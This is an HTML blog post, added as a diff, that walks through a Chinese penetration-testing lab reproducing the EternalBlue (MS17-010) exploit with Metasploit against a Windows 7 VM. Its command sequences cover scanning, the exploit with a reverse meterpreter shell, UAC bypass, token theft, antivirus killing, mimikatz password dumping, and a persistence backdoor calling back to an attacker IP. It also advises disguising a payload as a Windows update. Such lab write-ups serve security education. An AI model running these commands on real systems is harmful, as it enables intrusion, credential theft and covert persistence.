@@ -1,0 +1,479 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>永恒之蓝漏洞复现（流程模拟） | Qidangge的小小世界</title><meta name="keywords" content="渗透测试,metasploit,永恒之蓝漏洞"><meta name="author" content="Qidangge"><meta name="copyright" content="Qidangge"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本篇博客主要的借用永恒之蓝漏洞模拟一下渗透测试的流程。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="永恒之蓝漏洞复现（流程模拟）">
+<meta property="og:url" content="https://qidangge.github.io/2021/12/13/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B5%81%E7%A8%8B%E6%A8%A1%E6%8B%9F%EF%BC%89/index.html">
+<meta property="og:site_name" content="Qidangge的小小世界">
+<meta property="og:description" content="本篇博客主要的借用永恒之蓝漏洞模拟一下渗透测试的流程。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/img/202110151706732.jpg">
+<meta property="article:published_time" content="2021-12-13T07:25:06.165Z">
+<meta property="article:modified_time" content="2021-12-12T23:22:50.000Z">
+<meta property="article:author" content="Qidangge">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="metasploit">
+<meta property="article:tag" content="永恒之蓝漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/qidangge/picgo/raw/master/img/202110151706732.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://qidangge.github.io/2021/12/13/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B5%81%E7%A8%8B%E6%A8%A1%E6%8B%9F%EF%BC%89/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Qidangge","link":"链接: ","source":"来源: Qidangge的小小世界","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '永恒之蓝漏洞复现（流程模拟）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-13 07:22:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/./img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://gitee.com/qidangge/picgo/raw/master/img/202110151706732.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Qidangge的小小世界</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">永恒之蓝漏洞复现（流程模拟）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-13T07:25:06.165Z" title="发表于 2021-12-13 15:25:06">2021-12-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-12T23:22:50.000Z" title="更新于 2021-12-13 07:22:50">2021-12-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/">渗透测试作业</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="永恒之蓝漏洞复现（流程模拟）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="情报搜集阶段"><a href="#情报搜集阶段" class="headerlink" title="情报搜集阶段"></a>情报搜集阶段</h1><h3 id="查看本机ip"><a href="#查看本机ip" class="headerlink" title="查看本机ip"></a>查看本机ip</h3><blockquote>
+<p><code>ifconfig</code> 查看ip地址</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639285932081.png" alt="查看ip"></p>
+<h3 id="nmap扫描子网"><a href="#nmap扫描子网" class="headerlink" title="nmap扫描子网"></a>nmap扫描子网</h3><blockquote>
+<p><code>nmap 192.168.21.129/24 扫描子网</code></p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286382975.png" alt="子网扫描"></p>
+<h3 id="查看扫描结果，并进行分析"><a href="#查看扫描结果，并进行分析" class="headerlink" title="查看扫描结果，并进行分析"></a>查看扫描结果，并进行分析</h3><h1 id="威胁建模阶段"><a href="#威胁建模阶段" class="headerlink" title="威胁建模阶段"></a>威胁建模阶段</h1><p>发现有目标开启了445端口，对其进行进一步扫描，查看操作系统及服务</p>
+<blockquote>
+<p><code>nmap -O -sV 192.168.21.154 </code></p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286493773.png" alt="查看操作系统"></p>
+<p>发现该主机开启445端口，并且为win7操作系统，判断可以进行永恒之蓝漏洞利用。</p>
+<h1 id="漏洞分析阶段"><a href="#漏洞分析阶段" class="headerlink" title="漏洞分析阶段"></a>漏洞分析阶段</h1><h3 id="进入MSF框架"><a href="#进入MSF框架" class="headerlink" title="进入MSF框架"></a>进入MSF框架</h3><blockquote>
+<p>msfconsole</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639286601159.png" alt="进入msf框架"></p>
+<h3 id="查找漏洞相关模块"><a href="#查找漏洞相关模块" class="headerlink" title="查找漏洞相关模块"></a>查找漏洞相关模块</h3><blockquote>
+<p><code>search ms17-010</code></p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639288040338.png" alt="模块查找"></p>
+<h3 id="利用扫描模块"><a href="#利用扫描模块" class="headerlink" title="利用扫描模块"></a>利用扫描模块</h3><blockquote>
+<p><code>use auxiliary/scanner/smb/smb_ms17_010</code><br><code>set rhost 192.168.21.154</code><br><code>run</code></p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639287954277.png" alt="漏洞扫描"></p>
+<p>通过漏洞扫描模块扫描后得出结果，此系统易受到永恒之蓝漏洞攻击</p>
+<h1 id="漏洞攻击阶段"><a href="#漏洞攻击阶段" class="headerlink" title="漏洞攻击阶段"></a>漏洞攻击阶段</h1><blockquote>
+<p>使用ms17-010攻击模块，对靶机进行攻击<br><code>search ms17-010----&gt;use id</code></p>
+</blockquote>
+<h3 id="查看参数"><a href="#查看参数" class="headerlink" title="查看参数"></a>查看参数</h3><blockquote>
+<p><code>show options</code></p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639306568136.png" alt="参数的查看"><br>需要设置目标主机的IP地址</p>
+<h3 id="设定参数"><a href="#设定参数" class="headerlink" title="设定参数"></a>设定参数</h3><blockquote>
+<p><code>set rhost 192.168.21.154</code></p>
+</blockquote>
+<h3 id="设置payload"><a href="#设置payload" class="headerlink" title="设置payload"></a>设置payload</h3><blockquote>
+<p><code>set payload windows/x64/meterpreter/reverse_tcp</code><br>注：如果没有设置payload,使用上漏洞只是回弹shell，使用后回弹meterpreter。</p>
+</blockquote>
+<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308549675.png" alt="payload"></p>
+<h3 id="run-gt-获得权限"><a href="#run-gt-获得权限" class="headerlink" title="run-&gt;获得权限"></a>run-&gt;获得权限</h3><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308573542.png" alt="得到shell"></p>
+<h1 id="后渗透攻击阶段"><a href="#后渗透攻击阶段" class="headerlink" title="后渗透攻击阶段"></a>后渗透攻击阶段</h1><blockquote>
+<p>一般在获得shell后即进入后渗透阶段。后渗透攻击，顾名思义就是漏洞利用成功后的攻击，即拿到系统权限后的后续操作。后渗透攻击阶段的操作，可分为两种：权限维持和内网渗透。这里主要是就第一个进行测试。</p>
+</blockquote>
+<h2 id="meterpreter的基本系统命令"><a href="#meterpreter的基本系统命令" class="headerlink" title="meterpreter的基本系统命令"></a>meterpreter的基本系统命令</h2><ul>
+<li>sessions    #sessions –h 查看帮助</li>
+<li>sessions -l #列出当前会话</li>
+<li>sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</li>
+<li>background  #将当前会话放置后台</li>
+</ul>
+<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639308757484.png" alt="状态切换"></p>
+<ul>
+<li>shell #进入目标机cmd shell</li>
+<li> sysinfo # 查看目标机系统信息</li>
+<li> getuid # 查看权限</li>
+<li>getpid # 获取当前进程的pid</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639366204474.png" alt="命令演示1"></p>
+<ul>
+<li> ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639366322903.png" alt="命令演示2"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><blockquote>
+<p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权</p>
+</blockquote>
+<h3 id="getsystem提权"><a href="#getsystem提权" class="headerlink" title="getsystem提权"></a>getsystem提权</h3><blockquote>
+<p>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639313241515.png" alt="getsystem"></p>
+<p>一般直接使用getsystem不会成功。</p>
+<blockquote>
+<p>ps:<br>在meterpreter shell界面，我们可以通过shell命令，进入cmd命令提示符，使用<code>net user</code>查看当前用户，发现当前用户实际是在管理组administrators组中，那为什么还提权不了呢？<br>原来，windows操作系统在vista以后增加了一个UAC的功能，英文全称User Access Control，该功能对管理员组的用户起到一定限制，进而保护计算机安全，当我们需要运行一些重要的程序，只有管理员权限才能运行的程序时，UAC功能都会弹出一个对话框，对用户进行询问，当用户点击了同意按钮，程序才会以管理员或system权限运行。因此，我们要想提权成功，首先要绕过windows的UAC限制，接下来我们来看常用的绕过UAC的套路。</p>
+</blockquote>
+<h3 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a>bypassuac</h3><blockquote>
+<p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限.</p>
+</blockquote>
+<ul>
+<li><code>use exploit/windows/local/bypassuac</code></li>
+<li><code>use exploit/windows/local/bypassuac_injection</code></li>
+<li><code>use windows/local/bypassuac_vbs</code></li>
+<li><code>use windows/local/ask</code></li>
+</ul>
+<p>下面以其中一个举例：（其他几个操作类似）<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639367106726.png" alt="使用模块"></p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639367188142.png" alt="getsystem成功"></p>
+<h3 id="提高程序运行级别"><a href="#提高程序运行级别" class="headerlink" title="提高程序运行级别"></a>提高程序运行级别</h3><blockquote>
+<p>这种方法可以利用<code>exploit/windows/local/ask模块</code>，但是该模块实际上只是以高权限重启一个返回式shellcode,并没有绕过UAC，会触发系统UAC，受害机器有提示，提示用户是否要运行，如果用户选择“yes”，就可以程序返回一个高权限meterpreter shell(需要执行getsystem)。</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639317929928.png" alt="set信息"><br>注：我们可以把name改为windows_updata.exe迷惑操作者。</p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639317543810.png" alt="靶机弹窗"></p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639318047407.png" alt="getsystem"></p>
+<h3 id="利用windows提权漏洞进行提权"><a href="#利用windows提权漏洞进行提权" class="headerlink" title="利用windows提权漏洞进行提权"></a>利用windows提权漏洞进行提权</h3><blockquote>
+<p>上述getsystem提权需要用户在管理组，如果不是，就需要使用其他方法提权。这里介绍利用已有的漏洞进行提权。</p>
+</blockquote>
+<ul>
+<li><p>这里先利用enum_patches模块 收集补丁信息，然后查找可用的exploits进行提权</p>
+</li>
+<li><p>meterpreter &gt; <code>run post/windows/gather/enum_patches</code>  #查看补丁信息</p>
+</li>
+<li><p>msf &gt; <code>use exploit/windows/local/ms13_053_schlamperei</code>  #使用具体的exp,根据列出的具体可用exp而定</p>
+</li>
+<li><p>msf &gt; <code>set SESSION 2   </code></p>
+</li>
+<li><p>msf &gt; <code>exploit</code></p>
+<ol start="2">
+<li>也可以使用local_exploit_suggester进行查询哪些exp可以用.</li>
+</ol>
+</li>
+<li><p><code>use post/multi/recon/local_exploit_suggester</code></p>
+</li>
+<li><p><code>set session i</code></p>
+</li>
+<li><p><code>set lhost 192.168.xxx.xxx</code></p>
+</li>
+<li><p><code>run</code></p>
+</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639368455537.png" alt="查询"></p>
+<h3 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h3><blockquote>
+<p>另一个提权的方法是扮演一个帐户从一个特定进程偷取令牌。为此，我们需要“incognito”扩展.</p>
+</blockquote>
+<ul>
+<li><code>use incognito </code>                                 #help incognito  查看帮助</li>
+<li><code>list_tokens -u </code>                              #查看可用的token</li>
+<li><code>impersonate_token &#39;NT AUTHORITY\SYSTEM&#39;</code>         #假冒SYSTEM token</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370391327.png" alt="假冒token"></p>
+<ul>
+<li><code>list_tokens -g</code> #列出目标主机用户组的可用令牌</li>
+</ul>
+<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370584443.png" alt="用户组可用令牌"></p>
+<ul>
+<li> meterpreter &gt;<code>execute -f cmd.exe -i -t</code> #调用域权限shell</li>
+<li> <code>chcp 65001</code> #UTF-8编码代码页，解决乱码</li>
+<li> meterpreter &gt; <code>getuid</code></li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370812087.png" alt="shell"></p>
+<ul>
+<li><code>steal_token </code>    #从指定进程中窃取token   先ps列出可用的值</li>
+<li><code>drop_token</code>            #删除窃取的token</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639371086237.png" alt="进程"></p>
+<ul>
+<li><p><code>rev2self </code>              #返回原始token</p>
+</li>
+<li><p><code>migrate+pid </code>  #将当前会话进程迁移到一个指定的进程ID<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639371481362.png" alt="进程迁移"></p>
+</li>
+</ul>
+<h2 id="后续提权操作"><a href="#后续提权操作" class="headerlink" title="后续提权操作"></a>后续提权操作</h2><h3 id="基本信息搜集"><a href="#基本信息搜集" class="headerlink" title="基本信息搜集"></a>基本信息搜集</h3><ol>
+<li>检测是否为虚拟机<blockquote>
+<p><code>run post/windows/gather/checkvm</code> #是否虚拟机</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309037371.png" alt="是否运行在虚拟机"></p>
+<ol start="2">
+<li>关闭杀毒软件<blockquote>
+<p><code>run killav </code></p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309117079.png" alt="关闭杀毒软件"></p>
+<ol start="3">
+<li>获取安装软件信息<blockquote>
+<p><code>run post/windows/gather/enum_applications</code> #获取安装软件信息</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639372062857.png" alt="软件信息"></p>
+<ol start="4">
+<li>获取最近的文件操作<blockquote>
+<p><code>run post/windows/gather/dumplinks</code>   #获取最近的文件操作</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639372106444.png" alt="文件操作"></p>
+<ol start="5">
+<li>列举登录过的用户</li>
+</ol>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309269151.png" alt="列举登录过的用户"></p>
+<h3 id="hash与明文密码读取"><a href="#hash与明文密码读取" class="headerlink" title="hash与明文密码读取"></a>hash与明文密码读取</h3><ul>
+<li><code>load mimikatz</code>    #help mimikatz 查看帮助</li>
+<li><code> wdigest</code>  #获取Wdigest密码</li>
+<li><code>mimikatz_command -f samdump::hashes</code>  #执行mimikatz原始命令</li>
+<li><code>mimikatz_command -f sekurlsa::searchPasswords</code></li>
+<li><code>run post/windows/gather/smart_hashdump</code>  #从SAM导出密码哈希需要SYSTEM权限</li>
+</ul>
+<h2 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h2><ul>
+<li>getwd 或者pwd # 查看当前工作目录  </li>
+<li>ls</li>
+<li>cd</li>
+<li><code>search -f *pass* </code>     # 搜索文件  -h查看帮助</li>
+<li>cat c:\lltest\lltestpasswd.txt  # 查看文件内容</li>
+<li><code>upload /tmp/hack.txt C:\\lltest </code> # 上传文件到目标机上</li>
+<li><code>download c:\\lltest\\lltestpasswd.txt /tmp/ </code># 下载文件到本机上</li>
+<li>edit c:\1.txt #编辑或创建文件  没有的话，会新建文件</li>
+<li>rm C:\lltest\hack.txt</li>
+<li><code>mkdir lltest2 </code> #只能在当前目录下创建文件夹</li>
+<li><code>rmdir lltest2</code>  #只能删除当前目录下文件夹</li>
+<li>getlwd   或者 lpwd   #操作攻击者主机 查看当前目录</li>
+<li>lcd /tmp   #操作攻击者主机 切换目录</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><blockquote>
+<p>信息收集的脚本位于：<br>/usr/share/metasploit-framework/modules/post/windows/gather<br>/usr/share/metasploit-framework/modules/post/linux/gather</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639373652409.png" alt="脚本位置"></p>
+<ul>
+<li>run post/windows/gather/checkvm #是否虚拟机</li>
+<li>run post/linux/gather/checkvm #是否虚拟机</li>
+<li>run post/windows/gather/forensics/enum_drives #查看分区</li>
+<li>run post/windows/gather/enum_applications #获取安装软件信息</li>
+<li>run post/windows/gather/dumplinks   #获取最近的文件操作</li>
+<li>run post/windows/gather/enum_ie  #获取IE缓存</li>
+<li>run post/windows/gather/enum_chrome   #获取Chrome缓存</li>
+<li>run post/windows/gather/enum_patches  #补丁信息</li>
+<li>run post/windows/gather/enum_domain  #查找域控</li>
+</ul>
+<h2 id="后门植入"><a href="#后门植入" class="headerlink" title="后门植入"></a>后门植入</h2><blockquote>
+<p>metasploit自带的后门有两种方式启动的，一种是通过启动项启动(persistence)，一种是通过服务启动(metsvc)，另外还可以通过persistence_exe自定义后门文件。</p>
+</blockquote>
+<h3 id="启动项植入"><a href="#启动项植入" class="headerlink" title="启动项植入"></a>启动项植入</h3><ul>
+<li>run persistence –h  #查看帮助</li>
+<li>run persistence -X -i 5 -p 6661 -r 192.168.159.134 #-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</li>
+</ul>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639374019249.png" alt="后门1"></p>
+<p>后门的连接：</p>
+<ul>
+<li>msf &gt; use exploit/multi/handler</li>
+<li>msf &gt; set payload windows/meterpreter/reverse_tcp</li>
+<li>msf &gt; set LHOST 192.168.159.134</li>
+<li>msf &gt; set LPORT 6661</li>
+<li>msf &gt; exploit</li>
+</ul>
+<p> 也可以自己生成被控端，而后通过upload指令将其放到靶机的启动目录。</p>
+<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320429265.png" alt="被控端生成"></p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320736490.png" alt="主控端"></p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320789421.png" alt="靶机运行"></p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639321161778.png" alt="连接成功"></p>
